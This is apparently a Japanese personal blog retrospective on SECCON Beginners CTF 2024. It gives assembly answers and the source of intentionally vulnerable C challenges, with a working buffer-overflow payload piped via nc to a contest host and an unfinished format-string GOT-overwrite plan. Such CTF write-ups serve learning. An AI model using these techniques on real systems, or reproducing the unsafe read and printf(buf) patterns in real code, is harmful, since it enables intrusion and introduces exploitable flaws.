+++
date = 2024-06-17
title = "SECCON Beginners CTF 敗戦記"
[taxonomies]
tags = ["Tech", "Pwn", "Asm", "C", "CTF"]
+++
# この記事について
この記事はWriteupというより敗戦記です。
Writeupを期待した方には申し訳ありません。
どっちかって言うと自分を戒めるための記事として書きました。

<!-- more-->

---

# 結果
惨敗しました。チーム人数が少ないというのもあるかもしれませんが、それ以上に私がreversingに関して1問も解けなかったことが最も悔しい部分です。
去年のhalf、three、pokerぐらいなら解けたので、慢心して高を括っていたのですが、今年のassembleとcha-ll-engeに惨敗しました。(というかassembleに関しては知識が足りませんでした。)
またpwnに関しても、simpleoverflowやsimpleroverwriteは解けましたが、pure-and-easyが解けずに負けました。
ROPに関しては今回も全く分からなかったのでこれは今後の課題なのですが、それにしてもpure-and-easyぐらいは解きたかったですね。

とりあえずここから下はwriteupというか、解こうとして解けた問題と解けなかった問題について書いていきます。

---

# reversing / assemble (途中まで解けた)
challenge 1, 2, 3までは解けました。

challenge 1
```
mod rax, 0x123
```

challenge 2
```
mov rax, 0x123
push rax
```

challenge 3
```
mov rax, 0x1
mov rdi, 0x1
mov rdx, 0x1

push 0x48
mov rsi, rsp
syscall

push 0x65
mov rsi, rsp
syscall

push 0x6c
mov rsi, rsp
syscall

push 0x6c
mov rsi, rsp
syscall

push 0x6f
mov rsi, rsp
syscall
```
多分challenge 3に関しては文字列をまとめて`push`してから、`write`システムコールかければ一回で文字列を出力できたと思います。つまり無駄に長い回答ってこと。

challenge 4が無理でした。

---

# reversing / cha-ll-enge (解けてない)
配られたファイル`cha.ll.enge`がllvmにおけるIRであることまでは理解したのですが、初めてllvm関連に遭遇したので全く分かりませんでした。

---

# reversing / construct (解けてない)
mainが他の関数などを制御してないプログラムを初めて見たので全く歯が立ちませんでした。

---

# pwn / simpleoverflow
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[10] = {0};
  int is_admin = 0;
  printf("name:");
  read(0, buf, 0x10);
  printf("Hello, %s\n", buf);
  if (!is_admin) {
    puts("You are not admin. bye");
  } else {
    system("/bin/cat ./flag.txt");
  }
  return 0;
}

__attribute__((constructor)) void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(120);
}

```
ソースコードを見ると、`buf[10]`に対して、`read(0, buf, 0x10)`としており、`0x10`は10進数に直すと16なので、bufの領域を超えて値を書き込めることが分かりました。
さらには`is_admin`が`buf`より上位のアドレスにあるため、バッファオーバーフローで値が上書きできそうだと分かります。
C言語は0でなければtrueなので、`if(!is_admin)`において`else`が実行されてフラグが獲得できます。

---

# pwn / simpleoverwrite
```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win() {
  char buf[100];
  FILE *f = fopen("./flag.txt", "r");
  fgets(buf, 100, f);
  puts(buf);
}

int main() {
  char buf[10] = {0};
  printf("input:");
  read(0, buf, 0x20);
  printf("Hello, %s\n", buf);
  printf("return to: 0x%lx\n", *(uint64_t *)(((void *)buf) + 18));
  return 0;
}

__attribute__((constructor)) void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(120);
}
```
Overflowとあるのでとりあえず大量に`A`を送ってみました。
```
AAAAAAAAAAAAAAAAAAA
```
ぐらいでリターンアドレスを1バイト侵食していたので、18バイトがリターンアドレスへのオフセットだと分かります。
また`win()`関数が`0x401186`にあったため、
```
perl -e 'print "A"x18 . "\x86\x11\x40\x00" | nc simpleoverwrite.beginners.seccon.games 9001
```
とすることでフラグがゲットできます。

---

# pwn / pure-and-easy (解けてない)
解けていませんが、その時考えていた全てのアイデアを書いておきます。
(後に他のwriteupとも比較するため)
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x100] = {0};
  printf("> ");
  read(0, buf, 0xff);
  printf(buf);
  exit(0);
}

void win() {
  char buf[0x50];
  FILE *fp = fopen("./flag.txt", "r");
  fgets(buf, 0x50, fp);
  puts(buf);
}

__attribute__((constructor)) void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(120);
}
```
はじめに、ソースコードより`printf(buf)`とその下にある`exit(0)`が見え、おそらく書式文字列攻撃で`exit(0)`のgotを書き換える問題だと考えました。

実際に、
```
checksec --file=chall
```
してみると、`Partial RELRO`で`No PIE`でもあったため、gotの書き換えは成功しそうです。


次に、
```
readelf -r chall
```
してみると、
```
000000404000  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000404008  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
000000404010  000400000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000404018  000500000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0
000000404020  000600000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000404028  000700000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0
000000404030  000900000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
000000404038  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 fopen@GLIBC_2.2.5 + 0
000000404040  000b00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
```
これより`exit()`の関数アドレスは`0x404040`にあることが分かります。

さらに、
```
objdump -M intel -D chall
```
でバイナリを覗き見ると、`win()`関数が
```
0000000000401341 <win>:
  401341:       55                      push   rbp
  401342:       48 89 e5                mov    rbp,rsp
  401345:       48 83 ec 70             sub    rsp,0x70
  401349:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  401350:       00 00 
    .
    .
    .
```
`0x401341`にあることが分かりました。
以上のことから、アドレス`0x404040`に`0x401341`を書き込むことができれば、`exit()`関数実行時に、`win()`関数へと遷移することができるはずだと考えました。

ここで、一度書式文字列攻撃を行って、入力文字がスタックの何番目に出現するかを確認してみました。
```
$ perl -e 'print "AAAA" . "%p "x8' | nc pure-and-easy.beginners.seccon.games 9000
 
> AAAA0x7fffaf8caa90 0xff 0x7f275b9fea61 0x2 0x7f275bafe380 0x2520702541414141 0x2070252070252
070 0x7025207025207025 
```
このことより、6番目に入力した値が出現すると分かります。
であれば、6番目にアドレス`0x404040`を出現させ、ダイレクトパラメータアクセス('%Nx%6$n', Nはwin関数のアドレスに相当するバイト数のための空白の数)で`0x404040`に`0x401341`を書き込めば良いと変わります。

このとき、私は`0x401341`は10進数で`4199233`であり、入力するアドレス4バイト分を考慮した`4199229`をNとすれば良いと考えていました。ですが、一つの書式指定子はスタック上のデータ8バイトと紐付いているように見え、アドレスも4バイトではなく8バイトで指定するのかどうかが分かりませんでした。さらに8バイトで指定するなら、上位5バイトは全てナルバイトですからこれを一体どうやって挿入するべきかも分かりませんでした。

ここまでが考えられた全てで、fsbに関する知識不足を痛感しました。

---

# 最後に
自分へのメモ用途でもあるので、この記事を作成することで自分に足りない知識を自覚しつつ、次に繋げられるようにしたいと思います。具体的にはアセンブリによるシステムコールの詳細やllvm周辺の知識、fsbやROPの実践的な経験が足りないと今回のコンテストで痛感しました。

それとDockerが必要なことに今回始めて気づいて焦りました。急いで環境整えて必要なコマンドだけ覚えましたが、これも準備不足でした。
あと他の方のwriteupを見るとpwnに関してはpwntoolsも標準装備っぽいので、慣れていく必要がありそうです。
